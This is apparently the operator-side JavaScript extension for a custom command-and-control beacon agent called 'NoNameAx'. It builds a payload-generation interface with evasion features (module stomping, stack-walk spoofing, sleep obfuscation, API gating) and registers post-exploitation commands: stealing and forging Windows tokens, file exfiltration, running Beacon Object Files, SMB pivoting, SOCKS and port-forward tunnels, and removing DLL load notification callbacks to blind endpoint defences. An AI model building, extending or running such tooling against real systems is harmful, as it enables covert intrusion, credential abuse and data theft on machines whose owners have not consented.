
// ========= [ Context menu ] =========
// Right-click actions on a session - shown before the command console.
let action_term_thread  = menu.create_action("Terminate thread",  function(v) { v.forEach(s => ax.execute_command(s, "terminate thread")) });
let action_term_process = menu.create_action("Terminate process", function(v) { v.forEach(s => ax.execute_command(s, "terminate process")) });
let terminate_menu = menu.create_menu("Terminate");
terminate_menu.addItem(action_term_thread);
terminate_menu.addItem(action_term_process);
menu.add_session_agent(terminate_menu, ["NoNameAx"]);

// ========= [ Browser menus ] =========
let process_browser_action = menu.create_action("Process Browser", function(v) { v.forEach(s => ax.open_browser_process(s)) });
menu.add_session_browser(process_browser_action, ["NoNameAx"]);
let shell_browser_action = menu.create_action("Remote Shell", function(v) { v.forEach(s => ax.open_remote_shell(s)) });
menu.add_session_browser(shell_browser_action, ["NoNameAx"]);

// ========= [ Tunnel access ] =========
let tunnel_access_action = menu.create_action("Create Tunnel", function(v) { ax.open_access_tunnel(v[0], true, true, true, true) });
menu.add_session_access(tunnel_access_action, ["NoNameAx"]);

// ========= [ Process browser hook ] =========
event.on_processbrowser_list(function(agentId) { ax.execute_browser(agentId, "ps list"); }, ["NoNameAx"]);

// ========= [ Agent build UI ] =========
function GenerateUI(listeners_type)
{
    let isSmb = listeners_type.includes("NoNameAxSMB");
    let container = form.create_container();

    // ========= [ Tab 1: Beacon ] =========

    let tab1 = form.create_gridlayout();
    let t1r = 0;

    if (!isSmb) {
        let spinSleep = form.create_spin();
        spinSleep.setRange(1, 3600);
        spinSleep.setValue(10);
        let spinJitter = form.create_spin();
        spinJitter.setRange(0, 100);
        spinJitter.setValue(0);
        tab1.addWidget(form.create_label("Sleep (seconds):"), t1r, 0); tab1.addWidget(spinSleep,  t1r, 1); t1r++;
        tab1.addWidget(form.create_label("Jitter (%):"),      t1r, 0); tab1.addWidget(spinJitter, t1r, 1); t1r++;
        container.put("sleep",  spinSleep);
        container.put("jitter", spinJitter);
    }

    let comboFormat = form.create_combo();
    comboFormat.addItems(["Bin", "Exe", "Dll", "Svc"]);
    let textSvcName = form.create_textline("NaxService");
    textSvcName.setEnabled(false);
    let textDllExport = form.create_textline("Runner");
    textDllExport.setEnabled(false);
    let checkDebug = form.create_check("Enable DPRINT (DebugView)");
    let checkRebuild = form.create_check("Full rebuild (clean + compile all)");
    checkRebuild.setChecked(true);

    form.connect(comboFormat, "currentTextChanged", function() {
        let fmt = comboFormat.currentText();
        textSvcName.setEnabled(fmt === "Svc");
        textDllExport.setEnabled(fmt === "Dll");
    });

    tab1.addWidget(form.create_label("Output Format:"), t1r, 0); tab1.addWidget(comboFormat,   t1r, 1); t1r++;
    tab1.addWidget(form.create_label("Service Name:"),  t1r, 0); tab1.addWidget(textSvcName,   t1r, 1); t1r++;
    tab1.addWidget(form.create_label("DLL Export:"),    t1r, 0); tab1.addWidget(textDllExport, t1r, 1); t1r++;
    tab1.addWidget(form.create_label("Debug:"),         t1r, 0); tab1.addWidget(checkDebug,    t1r, 1); t1r++;
    tab1.addWidget(form.create_label("Build:"),         t1r, 0); tab1.addWidget(checkRebuild,  t1r, 1); t1r++;

    container.put("output_format", comboFormat);
    container.put("svc_name", textSvcName);
    container.put("dll_export", textDllExport);
    container.put("debug", checkDebug);
    container.put("full_rebuild", checkRebuild);

    let tab1Panel = form.create_panel();
    tab1Panel.setLayout(tab1);

    // ========= [ Tab 2: Evasion ] =========

    let tab2 = form.create_gridlayout();
    let t2r = 0;

    // --- Loader ---
    let checkStomp = form.create_check("Module stomping (image-backed beacon)");
    checkStomp.setChecked(true);
    let comboStompTech = form.create_combo();
    comboStompTech.addItems(["Basic (LoadLibraryEx)", "Custom"]);
    let comboStompDll = form.create_textline("chakra.dll");
    let checkUnwind = form.create_check("Stomp .pdata (valid stack walks)");
    checkUnwind.setChecked(true);
    let checkThreadPool = form.create_check("Thread pool (TppWorkerThread start addr)");
    checkThreadPool.setChecked(true);

    form.connect(checkStomp, "stateChanged", function() {
        let on = checkStomp.isChecked();
        comboStompTech.setEnabled(on);
        comboStompDll.setEnabled(on);
        checkUnwind.setEnabled(on);
        if (!on) checkUnwind.setChecked(false);
    });

    let loaderLayout = form.create_gridlayout();
    loaderLayout.addWidget(form.create_label("Module Stomp:"), 0, 0); loaderLayout.addWidget(checkStomp,      0, 1);
    loaderLayout.addWidget(form.create_label("Technique:"),    1, 0); loaderLayout.addWidget(comboStompTech,  1, 1);
    loaderLayout.addWidget(form.create_label("Stomp DLL:"),    2, 0); loaderLayout.addWidget(comboStompDll,   2, 1);
    loaderLayout.addWidget(form.create_label("Unwind:"),       3, 0); loaderLayout.addWidget(checkUnwind,     3, 1);
    loaderLayout.addWidget(form.create_label("Execution:"),    4, 0); loaderLayout.addWidget(checkThreadPool, 4, 1);

    let loaderPanel = form.create_panel();
    loaderPanel.setLayout(loaderLayout);
    let loaderGroup = form.create_groupbox("Loader", false);
    loaderGroup.setPanel(loaderPanel);
    tab2.addWidget(loaderGroup, t2r, 0, 1, 2); t2r++;

    container.put("module_stomp", checkStomp);
    container.put("stomp_advanced", comboStompTech);
    container.put("stomp_dll", comboStompDll);
    container.put("stomp_unwind", checkUnwind);
    container.put("thread_pool", checkThreadPool);

    // --- BOF ---
    let checkBofStomp = form.create_check("Image-backed BOF .text");
    checkBofStomp.setChecked(true);
    let textBofSyncDll = form.create_textline("chakra.dll");
    let listBofAsyncDlls = form.create_list();
    listBofAsyncDlls.addItems(["jscript9.dll", "mshtml.dll", "d3d11.dll"]);

    let textBofAsyncAdd = form.create_textline("");
    textBofAsyncAdd.setPlaceholder("DLL name...");
    let btnBofAsyncAdd = form.create_button("+");
    let btnBofAsyncRm  = form.create_button("-");
    form.connect(btnBofAsyncAdd, "clicked", function() {
        let v = textBofAsyncAdd.text();
        if (v && v.length > 0) { listBofAsyncDlls.addItem(v); textBofAsyncAdd.setText(""); }
    });
    form.connect(btnBofAsyncRm, "clicked", function() {
        let r = listBofAsyncDlls.currentRow();
        if (r >= 0) listBofAsyncDlls.removeItem(r);
    });
    form.connect(checkBofStomp, "stateChanged", function() {
        let on = checkBofStomp.isChecked();
        textBofSyncDll.setEnabled(on);
        listBofAsyncDlls.setEnabled(on);
        textBofAsyncAdd.setEnabled(on);
        btnBofAsyncAdd.setEnabled(on);
        btnBofAsyncRm.setEnabled(on);
    });

    let bofLayout = form.create_gridlayout();
    bofLayout.addWidget(form.create_label("BOF Stomping:"), 0, 0); bofLayout.addWidget(checkBofStomp,    0, 1);
    bofLayout.addWidget(form.create_label("Sync DLL:"),     1, 0); bofLayout.addWidget(textBofSyncDll,   1, 1);
    bofLayout.addWidget(form.create_label("Async DLLs:"),   2, 0); bofLayout.addWidget(listBofAsyncDlls, 2, 1);
    let asyncBtnLayout = form.create_hlayout();
    asyncBtnLayout.addWidget(textBofAsyncAdd);
    asyncBtnLayout.addWidget(btnBofAsyncAdd);
    asyncBtnLayout.addWidget(btnBofAsyncRm);
    let asyncBtnPanel = form.create_panel();
    asyncBtnPanel.setLayout(asyncBtnLayout);
    bofLayout.addWidget(form.create_label(""), 3, 0); bofLayout.addWidget(asyncBtnPanel, 3, 1);

    let bofPanel = form.create_panel();
    bofPanel.setLayout(bofLayout);
    let bofGroup = form.create_groupbox("BOF Execution", false);
    bofGroup.setPanel(bofPanel);
    tab2.addWidget(bofGroup, t2r, 0, 1, 2); t2r++;

    container.put("bof_stomp", checkBofStomp);
    container.put("bof_stomp_dll", textBofSyncDll);
    container.put("bof_stomp_pool", listBofAsyncDlls);

    // --- Sleep Obfuscation ---
    let comboSleepObf = form.create_combo();
    comboSleepObf.addItems(["Off", "On"]);
    comboSleepObf.setCurrentIndex(1);

    let sleepObfLayout = form.create_gridlayout();
    sleepObfLayout.addWidget(form.create_label("Sleep Obf:"), 0, 0);
    sleepObfLayout.addWidget(comboSleepObf, 0, 1);

    let sleepObfPanel = form.create_panel();
    sleepObfPanel.setLayout(sleepObfLayout);
    let sleepObfGroup = form.create_groupbox("Sleep Obfuscation", false);
    sleepObfGroup.setPanel(sleepObfPanel);
    tab2.addWidget(sleepObfGroup, t2r, 0, 1, 2); t2r++;

    container.put("sleep_obf", comboSleepObf);

    let tab2Panel = form.create_panel();
    tab2Panel.setLayout(tab2);

    // ========= [ Tab 3: BeaconGate ] =========

    let tab3 = form.create_gridlayout();
    let t3r = 0;

    let checkBeaconGate = form.create_check("Enable BeaconGate");
    checkBeaconGate.setChecked(false);
    tab3.addWidget(checkBeaconGate, t3r, 0, 1, 2); t3r++;

    tab3.addWidget(form.create_label("Sleepmask Stomp DLL:"), t3r, 0);
    let textSmStompDll = form.create_textline("msxml6.dll");
    textSmStompDll.setEnabled(false);
    tab3.addWidget(textSmStompDll, t3r, 1); t3r++;

    tab3.addWidget(form.create_label("Gated APIs (exact Win32 name → NAX_GATE_TOUPPER):"), t3r, 0, 1, 2); t3r++;

    let listGateAPIs = form.create_list();
    listGateAPIs.addItems(["Sleep", "WaitForSingleObject", "WaitForMultipleObjects"]);
    listGateAPIs.setEnabled(false);

    let textGateAPIAdd = form.create_textline("");
    textGateAPIAdd.setPlaceholder("Win32 function name...");
    textGateAPIAdd.setEnabled(false);
    let btnGateAPIAdd = form.create_button("+");
    btnGateAPIAdd.setEnabled(false);
    let btnGateAPIRm = form.create_button("-");
    btnGateAPIRm.setEnabled(false);

    form.connect(btnGateAPIAdd, "clicked", function() {
        let v = textGateAPIAdd.text();
        if (v && v.length > 0) { listGateAPIs.addItem(v); textGateAPIAdd.setText(""); }
    });
    form.connect(btnGateAPIRm, "clicked", function() {
        let r = listGateAPIs.currentRow();
        if (r >= 0) listGateAPIs.removeItem(r);
    });

    tab3.addWidget(listGateAPIs, t3r, 0, 1, 2); t3r++;
    let gateBtnLayout = form.create_hlayout();
    gateBtnLayout.addWidget(textGateAPIAdd);
    gateBtnLayout.addWidget(btnGateAPIAdd);
    gateBtnLayout.addWidget(btnGateAPIRm);
    let gateBtnPanel = form.create_panel();
    gateBtnPanel.setLayout(gateBtnLayout);
    tab3.addWidget(gateBtnPanel, t3r, 0, 1, 2); t3r++;

    form.connect(checkBeaconGate, "stateChanged", function() {
        let on = checkBeaconGate.isChecked();
        textSmStompDll.setEnabled(on);
        listGateAPIs.setEnabled(on);
        textGateAPIAdd.setEnabled(on);
        btnGateAPIAdd.setEnabled(on);
        btnGateAPIRm.setEnabled(on);
        if (on) {
            checkStomp.setChecked(true);
            checkStomp.setEnabled(false);
            checkUnwind.setChecked(true);
            checkUnwind.setEnabled(false);
        } else {
            checkStomp.setEnabled(true);
            checkUnwind.setEnabled(checkStomp.isChecked());
        }
    });

    container.put("beacongate", checkBeaconGate);
    container.put("sm_stomp_dll", textSmStompDll);
    container.put("gate_apis", listGateAPIs);

    let tab3Panel = form.create_panel();
    tab3Panel.setLayout(tab3);

    // ========= [ Tabs ] =========

    let tabs = form.create_tabs();
    tabs.addTab(tab1Panel, "Beacon");
    tabs.addTab(tab2Panel, "Evasion");
    tabs.addTab(tab3Panel, "BeaconGate");

    let rootLayout = form.create_vlayout();
    rootLayout.addWidget(tabs);
    let rootPanel = form.create_panel();
    rootPanel.setLayout(rootLayout);

    return {
        ui_panel: rootPanel,
        ui_container: container,
        ui_height: isSmb ? 300 : 420,
        ui_width: 450
    };
}


// ========= [ Command registration ] =========
// To add a new command:
//   1. Create it with ax.create_command(name, description, example, queued_msg)
//   2. Add args with addArgString / addArgInt / addArgBool
//   3. For commands with sub-commands: create children first, then parent.addSubCommands([...])
//   4. Add to the array passed to ax.create_commands_group(...)
//   5. Implement CreateCommand case in pl_main.go, add beacon handler in Commands/

function RegisterCommands(listenerType)
{
    // ---- watchdog (enable/disable job timeout) ----
    let cmd_watchdog_on  = ax.create_command("on",  "Enable watchdog (BOF timeout enforcement)", "watchdog on",  "Enabling watchdog...");
    let cmd_watchdog_off = ax.create_command("off", "Disable watchdog (BOFs run without timeout)", "watchdog off", "Disabling watchdog...");
    let cmd_watchdog = ax.create_command("watchdog", "Enable or disable the async BOF watchdog");
    cmd_watchdog.addSubCommands([cmd_watchdog_on, cmd_watchdog_off]);

    // ---- whoami ----
    let cmd_whoami = ax.create_command(
        "whoami",
        "Return the current Windows username (via GetUserNameW)",
        "whoami",
        "Queuing whoami..."
    );

    // ---- sleep ----
    let cmd_sleep = ax.create_command(
        "sleep",
        "Update the beacon sleep interval and optional jitter percentage",
        "sleep {sleep} {jitter}",
        "Queuing sleep..."
    );
    cmd_sleep.addArgString("sleep", true,  "Seconds or duration e.g. 10, 500ms, 1.5s, 1m30s");
    cmd_sleep.addArgInt   ("jitter", false, "Max random ± % added to sleep (0–100)");

    // ---- filesystem ----
    let cmd_cd = ax.create_command("cd", "Change the working directory", "cd {path}", "Queuing cd...");
    cmd_cd.addArgString("path", true, "Target directory (absolute or relative)");

    let cmd_pwd = ax.create_command("pwd", "Print the current working directory", "pwd", "Queuing pwd...");

    let cmd_mkdir = ax.create_command("mkdir", "Create a directory", "mkdir {path}", "Queuing mkdir...");
    cmd_mkdir.addArgString("path", true, "Directory path to create");

    let cmd_rmdir = ax.create_command("rmdir", "Remove a directory", "rmdir {path}", "Queuing rmdir...");
    cmd_rmdir.addArgString("path", true, "Directory path to remove");

    let cmd_cat = ax.create_command("cat", "Read and display a file", "cat {path}", "Queuing cat...");
    cmd_cat.addArgString("path", true, "File path (absolute recommended)");

    // ---- terminate ----
    // Sub-commands are shown when the user types `terminate` or `help terminate`.
    let cmd_terminate_thread = ax.create_command(
        "thread",
        "Exit the current beacon thread (RtlExitUserThread - leaves process alive)",
        "terminate thread",
        "Queuing terminate thread..."
    );
    let cmd_terminate_process = ax.create_command(
        "process",
        "Kill the entire beacon process (ExitProcess - hard stop)",
        "terminate process",
        "Queuing terminate process..."
    );
    let cmd_rm = ax.create_command("rm", "Delete a file", "rm {path}", "Queuing rm...");
    cmd_rm.addArgString("path", true, "File path to delete");

    // ---- download ----
    let cmd_download = ax.create_command("download", "Download a file from the agent machine", "download {path} {chunk_size}", "Queuing download...");
    cmd_download.addArgString("path", true, "Absolute path of the file to download");
    cmd_download.addArgString("chunk_size", false, "Chunk size per heartbeat (e.g. 4MB, 512KB, default uses global setting)");

    // ---- upload ----
    let cmd_upload = ax.create_command("upload", "Upload a file from operator to agent machine", "upload {file} {remote_path} {chunk_size}", "Queuing upload...");
    cmd_upload.addArgFile("file", true, "Local file to upload");
    cmd_upload.addArgString("remote_path", true, "Destination path on the agent machine");
    cmd_upload.addArgString("chunk_size", false, "Chunk size per task (e.g. 2MB, 512KB, default 2MB, max 4MB)");

    // ---- bof (direct, manual args) ----
    let cmd_bof = ax.create_command("bof", "Execute a Beacon Object File in-process", "bof {file} {args}", "Queuing BOF...");
    cmd_bof.addArgFile("file", true, "COFF .o file (uploaded from operator machine)");
    cmd_bof.addArgString("args", false, "Packed args: comma-separated type:value (str:hello,int:42,wstr:world,short:1)");

    // ---- execute bof (Extension-Kit compatible) ----
    // Matches the Kharon/Adaptix standard interface used by all Extension-Kit scripts:
    //   execute bof "/path/to/bof.x64.o" <hex_packed_args>
    // bof_file is uploaded by Adaptix (base64 in args); param_data is a hex string
    // produced by ax.bof_pack("cstr,int,...", [...]) in the script pre-hook.
    let cmd_exec_bof = ax.create_command("bof", "Execute a Beacon Object File (BOF) with optional parameters", "execute bof -a /path/to/bof.x64.o <params>", "Queuing BOF...");
    cmd_exec_bof.addArgBool("-a", "Run asynchronously (non-blocking)");
    cmd_exec_bof.addArgFlagInt("-t", "timeout", "Watchdog timeout in seconds (default 60)", 0);
    cmd_exec_bof.addArgFile("bof_file", true, "COFF .o file");
    cmd_exec_bof.addArgString("param_data", false);

    let cmd_execute = ax.create_command("execute", "Execute a Beacon Object File");
    cmd_execute.addSubCommands([cmd_exec_bof]);

    // ---- job (async BOF management) ----
    let cmd_job_list = ax.create_command("list", "List active async BOF jobs", "job list", "Listing jobs...");
    let cmd_job_kill = ax.create_command("kill", "Kill an async BOF job", "job kill <task_id>", "Killing job...");
    cmd_job_kill.addArgString("task_id", true, "Task ID of the job to kill (hex, e.g. a1b2c3d4)");
    let cmd_job = ax.create_command("job", "Manage async BOF jobs");
    cmd_job.addSubCommands([cmd_job_list, cmd_job_kill]);

    // ---- ps (process management) ----
    let cmd_ps_list = ax.create_command("list", "Show process list", "ps list", "Queuing ps list...");

    let cmd_ps_kill = ax.create_command("kill", "Kill a process by PID", "ps kill {pid}", "Queuing ps kill...");
    cmd_ps_kill.addArgInt("pid", true, "Process ID to terminate");

    let cmd_ps_run = ax.create_command("run", "Run a program", "ps run -o cmd.exe /c whoami /all", "Queuing ps run...");
    cmd_ps_run.addArgBool("-s", "Suspend process");
    cmd_ps_run.addArgBool("-o", "Output to console");
    cmd_ps_run.addArgBool("-i", "Use impersonation");
    cmd_ps_run.addArgString("args", true);

    let cmd_ps = ax.create_command("ps", "Process management");
    cmd_ps.addSubCommands([cmd_ps_list, cmd_ps_kill, cmd_ps_run]);

    // ---- token (token manipulation) ----
    let cmd_token_getuid = ax.create_command("getuid", "Show the current effective user identity", "token getuid", "Queuing token getuid...");

    let cmd_token_steal = ax.create_command("steal", "Steal a token from a target process", "token steal -i 1234", "Queuing token steal...");
    cmd_token_steal.addArgBool("-i", "Immediately impersonate the stolen token");
    cmd_token_steal.addArgInt("pid", true, "Target process ID");

    let cmd_token_impersonate = ax.create_command("impersonate", "Impersonate a stored token", "token impersonate 1", "Queuing token impersonate...");
    cmd_token_impersonate.addArgInt("token_id", true, "Token ID from 'token list'");

    let cmd_token_list = ax.create_command("list", "List all stored tokens", "token list", "Queuing token list...");

    let cmd_token_rm = ax.create_command("rm", "Remove a stored token", "token rm 1", "Queuing token rm...");
    cmd_token_rm.addArgInt("token_id", true, "Token ID to remove");

    let cmd_token_revert = ax.create_command("revert", "Drop impersonation and revert to process token", "token revert", "Queuing token revert...");

    let cmd_token_make = ax.create_command("make", "Create a token from credentials", "token make -t interactive DOMAIN user pass", "Queuing token make...");
    cmd_token_make.addArgString("domain", false, "Domain (e.g. CORP or . for local)");
    cmd_token_make.addArgString("username", true, "Username");
    cmd_token_make.addArgString("password", true, "Password");
    cmd_token_make.addArgString("-t", false, "Logon type: interactive | network | network_cleartext | new_credentials (default)");

    let cmd_token_privs = ax.create_command("privs", "List privileges of the current effective token", "token privs", "Queuing token privs...");

    let cmd_token = ax.create_command("token", "Token manipulation — steal, impersonate, create, list, revoke");
    cmd_token.addSubCommands([cmd_token_getuid, cmd_token_steal, cmd_token_impersonate, cmd_token_list, cmd_token_rm, cmd_token_revert, cmd_token_make, cmd_token_privs]);

    let cmd_ls = ax.create_command("ls", "List directory contents", "ls {path}", "Queuing ls...");
    cmd_ls.addArgString("path", false, "Directory to list (default: current working directory)");

    let cmd_terminate = ax.create_command(
        "terminate",
        "Terminate the beacon - choose 'thread' to exit the current thread only or 'process' to kill the whole process",
        "terminate thread"
    );
    cmd_terminate.addSubCommands([cmd_terminate_thread, cmd_terminate_process]);

    // ---- profile (runtime profile update) ----
    let cmd_profile = ax.create_command("profile", "Update the agent's C2 profile at runtime", "profile {file}", "Queuing profile update...");
    cmd_profile.addArgFile("file", true, "Profile JSON file (same format as profiles/*.json)");

    // ---- link (pivot) ----
    let cmd_link_smb = ax.create_command("smb", "Connect to a child beacon's SMB pipe", "link smb {target} {pipename}", "Queuing link smb...");
    cmd_link_smb.addArgString("target", true, "Target hostname or IP (e.g. DC01 or 10.0.0.5)");
    cmd_link_smb.addArgString("pipename", true, "Pipe name on the target (e.g. naxsmb)");

    let cmd_link = ax.create_command("link", "Link to a child beacon via named pipe or TCP");
    cmd_link.addSubCommands([cmd_link_smb]);

    // ---- unlink ----
    let cmd_unlink = ax.create_command("unlink", "Disconnect a linked pivot agent", "unlink {pivot_id}", "Queuing unlink...");
    cmd_unlink.addArgString("pivot_id", true, "Pivot ID (8-char hex shown in link result, e.g. 33bbd59a)");

    // ---- bof-stomp (runtime BOF module stomping config) ----
    let cmd_bs_sync = ax.create_command("sync", "Set the sync BOF stomping DLL", "bof-stomp sync chakra.dll", "");
    cmd_bs_sync.addArgString("dll", true, "DLL name for sync BOF stomping (e.g. chakra.dll)");
    cmd_bs_sync.addArgBool("-unload", "Free the old DLL instead of restoring original bytes");
    let cmd_bs_async = ax.create_command("async", "Set async BOF stomping DLL pool", "bof-stomp async jscript9.dll,mshtml.dll", "");
    cmd_bs_async.addArgString("dlls", true, "Comma-separated DLL names for async pool");
    cmd_bs_async.addArgBool("-unload", "Free the old DLLs instead of restoring original bytes");
    let cmd_bs_show = ax.create_command("show", "Show current BOF stomping config", "bof-stomp show", "");
    let cmd_bs_sm = ax.create_command("sleepmask", "Change the sleepmask stomp DLL and re-wire", "bof-stomp sleepmask msxml6.dll", "");
    cmd_bs_sm.addArgString("dll", true, "DLL name for sleepmask stomping (e.g. msxml6.dll)");
    cmd_bs_sm.addArgBool("-unload", "Free the old DLL instead of restoring original bytes");
    let cmd_bof_stomp = ax.create_command("bof-stomp", "Reconfigure BOF module stomping at runtime", "bof-stomp show", "Queuing BOF stomp config...");
    cmd_bof_stomp.addSubCommands([cmd_bs_sync, cmd_bs_async, cmd_bs_sm, cmd_bs_show]);

    // ---- lportfwd (local port forwarding) ----
    let cmd_lportfwd_start = ax.create_command("start", "Start local port forwarding (server listens, agent connects to target)", "lportfwd start 0.0.0.0 8080 10.0.0.5 3389", "Starting lportfwd...");
    cmd_lportfwd_start.addArgString("lhost", true, "Listening interface on server (e.g. 0.0.0.0)");
    cmd_lportfwd_start.addArgInt("lport", true, "Listen port on server");
    cmd_lportfwd_start.addArgString("fwdhost", true, "Target host the agent connects to");
    cmd_lportfwd_start.addArgInt("fwdport", true, "Target port the agent connects to");

    let cmd_lportfwd_stop = ax.create_command("stop", "Stop local port forwarding", "lportfwd stop 8080", "Stopping lportfwd...");
    cmd_lportfwd_stop.addArgInt("lport", true, "Server listen port to stop");

    let cmd_lportfwd = ax.create_command("lportfwd", "Manage local port forwarding (server -> agent -> target)");
    cmd_lportfwd.addSubCommands([cmd_lportfwd_start, cmd_lportfwd_stop]);

    // ---- rportfwd (reverse port forwarding) ----
    let cmd_rportfwd_start = ax.create_command("start", "Start reverse port forwarding (agent listens, server connects to target)", "rportfwd start 8080 10.0.0.1 4444", "Starting rportfwd...");
    cmd_rportfwd_start.addArgInt("lport", true, "Listen port on agent (127.0.0.1 only)");
    cmd_rportfwd_start.addArgString("fwdhost", true, "Target host the server connects to");
    cmd_rportfwd_start.addArgInt("fwdport", true, "Target port the server connects to");

    let cmd_rportfwd_stop = ax.create_command("stop", "Stop reverse port forwarding", "rportfwd stop 8080", "Stopping rportfwd...");
    cmd_rportfwd_stop.addArgInt("lport", true, "Agent listen port to stop");

    let cmd_rportfwd = ax.create_command("rportfwd", "Manage reverse port forwarding (agent -> server -> target)");
    cmd_rportfwd.addSubCommands([cmd_rportfwd_start, cmd_rportfwd_stop]);

    // ---- socks proxy ----
    let cmd_socks_start = ax.create_command("start", "Start a SOCKS proxy server", "socks start 1080 -auth user pass", "Starting SOCKS proxy...");
    cmd_socks_start.addArgFlagString("-h", "address", "Listening interface", "0.0.0.0");
    cmd_socks_start.addArgInt("port", true, "Listen port");
    cmd_socks_start.addArgBool("-socks4", "Use SOCKS4 (default: SOCKS5)");
    cmd_socks_start.addArgBool("-auth", "Enable username/password auth (SOCKS5 only)");
    cmd_socks_start.addArgString("username", false, "Auth username");
    cmd_socks_start.addArgString("password", false, "Auth password");

    let cmd_socks_stop = ax.create_command("stop", "Stop a SOCKS proxy server", "socks stop 1080", "Stopping SOCKS proxy...");
    cmd_socks_stop.addArgInt("port", true, "Port to stop");

    let cmd_socks = ax.create_command("socks", "Manage SOCKS proxy tunnels");
    cmd_socks.addSubCommands([cmd_socks_start, cmd_socks_stop]);

    // ---- dll-notify (DLL load notification unhooking) ----
    let cmd_dll_notify_list = ax.create_command("list", "List registered DLL load notification callbacks", "dll-notify list", "Listing DLL notifications...");
    let cmd_dll_notify_remove = ax.create_command("remove", "Remove all DLL load notification callbacks", "dll-notify remove", "Removing DLL notifications...");
    let cmd_dll_notify = ax.create_command("dll-notify", "Manage DLL load notification callbacks (LdrRegisterDllNotification)");
    cmd_dll_notify.addSubCommands([cmd_dll_notify_list, cmd_dll_notify_remove]);

    // ---- sleepmask-set (rebuild + send sleepmask BOF to agent) ----
    let cmd_sleepmask_set = ax.create_command(
        "sleepmask-set",
        "Rebuild and send the sleepmask BOF to the agent (enables BeaconGate Sleep proxy)",
        "sleepmask-set",
        "Rebuilding and sending sleepmask BOF..."
    );
    cmd_sleepmask_set.addArgBool("-debug", "Build with debug output (NaxDbg prints)");

    // ---- chunksize (download chunk size) ----
    let cmd_chunksize = ax.create_command("chunksize", "Set the download chunk size on the agent", "chunksize {size}", "Setting chunk size...");
    cmd_chunksize.addArgString("size", true, "Chunk size (e.g. 2MB, 512KB, 1048576, min 4KB, max 4MB)");

    // ---- sleepobf-config (runtime sleep obfuscation config) ----
    let cmd_sleepobf = ax.create_command(
        "sleepobf-config",
        "Configure sleep obfuscation at runtime",
        "sleepobf-config {sleep_obf}",
        "Queuing sleep obfuscation config..."
    );
    cmd_sleepobf.addArgString("sleep_obf", true, "Sleep obfuscation: on/off");

    let group = ax.create_commands_group("NoNameAx", [
        // cmd_whoami,
        cmd_sleep,
        cmd_cd, cmd_pwd, cmd_mkdir, cmd_rmdir, cmd_rm, cmd_cat, cmd_ls, cmd_ps,
        cmd_token,
        cmd_download, cmd_upload, cmd_bof,
        cmd_execute,
        cmd_job, cmd_watchdog,
        cmd_chunksize,
        cmd_profile,
        cmd_bof_stomp,
        cmd_sleepmask_set,
        cmd_sleepobf,
        cmd_dll_notify,
        cmd_link, cmd_unlink,
        cmd_lportfwd, cmd_rportfwd, cmd_socks,
        cmd_terminate
    ]);
    return { commands_windows: group };
}

// ========= [ Auto-inject sleepmask BOF ] =========
// Sleepmask is now embedded at build time (Config_sleepmask.h) and loaded
// during beacon init - no need to send it on first check-in.
// The sleepmask-set command still works for runtime updates.
